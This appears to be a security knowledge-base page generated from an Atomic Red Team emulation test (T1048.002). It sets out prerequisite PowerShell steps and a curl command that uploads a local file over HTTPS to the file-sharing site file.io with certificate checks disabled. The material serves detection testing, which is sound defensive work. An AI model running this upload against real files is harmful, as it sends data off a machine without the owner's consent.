---
atomic_guid: "1cdf2fb0-51b6-4fd8-96af-77020d5f1bf0"
title: "Exfiltrate data HTTPS using curl windows"
framework: "atomic"
generated: "true"
attack_technique_id: "T1048.002"
attack_technique_name: "Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048.002/T1048.002.yaml"
build_date: "2026-04-26 17:02:12"
executor: "command_prompt"
aliases:
  - "1cdf2fb0-51b6-4fd8-96af-77020d5f1bf0"
  - "Exfiltrate data HTTPS using curl windows"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Exfiltrate data HTTPS using curl windows

Exfiltrate data HTTPS using curl to file share site file.io

## Metadata

- Atomic GUID: 1cdf2fb0-51b6-4fd8-96af-77020d5f1bf0
- Technique: T1048.002: Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol
- Platforms: windows
- Executor: command_prompt
- Elevation Required: False
- Dependency Executor: powershell
- Source Path: atomics/T1048.002/T1048.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1048-exfiltration_over_alternative_protocol|T1048.002]]

## Input Arguments

### curl_path

- description: path to curl.exe
- type: path
- default: C:\Windows\System32\Curl.exe

### input_file

- description: Test file to upload
- type: path
- default: PathToAtomicsFolder/T1048.002/src/artifact

## Dependencies

Curl must be installed on system.

### Prerequisite Check

```powershell
if (Test-Path #{curl_path}) {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://curl.se/windows/dl-8.4.0_6/curl-8.4.0_6-win64-mingw.zip" -Outfile "PathToAtomicsFolder\..\ExternalPayloads\curl.zip"
Expand-Archive -Path "PathToAtomicsFolder\..\ExternalPayloads\curl.zip" -DestinationPath "PathToAtomicsFolder\..\ExternalPayloads\curl"
Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\curl\curl-8.4.0_6-win64-mingw\bin\curl.exe" C:\Windows\System32\Curl.exe
```

#{input_file} must be exist on system.

### Prerequisite Check

```powershell
if (Test-Path "#{input_file}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory (split-path "#{input_file}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1048.002/src/artifact" -OutFile "#{input_file}"
```

## Executor

- elevation_required: False
- name: command_prompt

### Command

```cmd
#{curl_path} -k -F "file=@#{input_file}" https://file.io/
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048.002/T1048.002.yaml)
